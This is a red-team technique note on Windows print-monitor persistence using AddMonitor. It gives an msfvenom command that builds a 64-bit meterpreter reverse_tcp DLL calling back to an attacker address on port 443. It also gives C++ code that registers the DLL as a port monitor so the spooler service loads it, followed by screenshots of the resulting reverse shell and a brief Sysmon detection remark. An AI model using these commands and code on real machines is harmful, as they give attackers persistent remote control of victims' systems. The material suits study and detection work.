# AddMonitor()

## AddMonitor()

### Execution

Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe:

{% code title="attacker\@local" %}
```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
```
{% endcode %}

Writing and compiling a simple C++ code that will register the monitor port:

{% code title="monitor.cpp" %}
```cpp
#include "stdafx.h"
#include "Windows.h"

int main() {	
	MONITOR_INFO_2 monitorInfo;
	TCHAR env[12] = TEXT("Windows x64");
	TCHAR name[12] = TEXT("evilMonitor");
	TCHAR dll[12] = TEXT("evil64.dll");
	monitorInfo.pName = name;
	monitorInfo.pEnvironment = env;
	monitorInfo.pDLLName = dll;
	AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);
	return 0;
}
```
{% endcode %}

Move evil64.dll to `%systemroot%` and execute the compiled `monitor.cpp`.

### Observations

Upon launching the compiled executable and inspecting the victim machine with procmon, we can see that the evil64.dll is being accessed by the spoolsvc:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIlQ5xtE1yTeMDmL5jU%2F-LIlSGDVDWgfUuC5qhF1%2Fmonitor-loaddll.png?alt=media\&token=2d5f2043-a0ec-4330-ae2d-f91a739e66b5)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIlQ5xtE1yTeMDmL5jU%2F-LIlTRPWcmMfj4NY1JTf%2Fmonitor-loaddll2.png?alt=media\&token=d3fde3b6-bb4a-43db-a521-3552cfcbacf4)

which eventually spawns a rundll32 with meterpreter payload, that initiates a connection back to the attacker:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIlQ5xtE1yTeMDmL5jU%2F-LIlTRPbvKjPvN2WG6VA%2Frundll-connect.png?alt=media\&token=2c67d091-7c30-42c7-bda9-c423843763fe)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIlVL6_UqQ_ydGFbVZn%2F-LIlVOJqUhVMxl-EVKGy%2Fmonitor-shell-system.png?alt=media\&token=a671e753-846a-4799-b621-b03136f3e9aa)

The below confirms the procmon results explained above:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIlQ5xtE1yTeMDmL5jU%2F-LIlU1xCNn4_OiX-JBKf%2Fmonitor-spoolsvc-rundll.png?alt=media\&token=7785943b-7db3-49a8-9cfb-14480759ad67)

Sysmon commandline arguments and network connection logging to the rescue:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LIlXQ2ZYqBT3hLcAfmo%2F-LIlXM5dx_1Wunt8J5W9%2Fmonitor-sysmon.png?alt=media\&token=ab244199-68f6-4422-9ebc-015ee6f78802)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1013" %}

{% embed url="https://youtu.be/dq2Hv7J9fvk" %}

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd183341(v=vs.85).aspx" %}

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/dd145068(v=vs.85).aspx" %}
